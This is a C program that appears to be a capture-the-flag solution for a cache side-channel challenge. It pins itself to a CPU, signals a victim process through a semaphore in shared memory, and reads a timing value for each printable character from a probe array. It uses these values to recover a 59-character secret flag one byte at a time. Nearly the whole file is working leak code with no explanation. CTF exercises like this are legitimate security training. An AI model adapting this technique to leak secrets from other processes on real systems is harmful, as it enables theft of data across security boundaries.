#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/mman.h>
#include <semaphore.h>
#include <stdint.h>
#include <sched.h>
#include <x86intrin.h>

#define PAGE_SIZE 0x1000

#define VICTIM_CPU 2
#define MEMSTART 0x1337000
#define SEM      (sem_t*) MEMSTART

#define FLAGLEN  59

void set_cpu(int cpu_num)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu_num, &set);
    sched_setaffinity(0, sizeof set, &set);
}

int main(void)
{
    char flag[FLAGLEN] = {0};

    for (int i = 0; i < FLAGLEN; i++)
    {
        memcpy((void*)(MEMSTART + sizeof(sem_t)),
               &(int){i}, sizeof(int));

        sem_post(SEM);
        sched_yield();

        int min[2] = {1000, 1000};
        for (int j = 33; j < 0x7f; j++)
        {
            uint64_t val = *(uint64_t*)(MEMSTART + PAGE_SIZE + PAGE_SIZE * j);
            printf("%2d/%3d (%c) val = %zu\n", i, j, j, val);
            if (val && min[1] > val) {
                min[1] = val;
                min[0] = j;
            }
        }

        flag[i] = min[0];
        printf("\n\n - %c - \n\n", flag[i]);

        if (i == 2 && memcmp(flag, "pwn", 3)) {
            printf("problem!: %s\n", flag);
            exit(1);
        }
    }

    printf("flag: %s\n", flag);
}
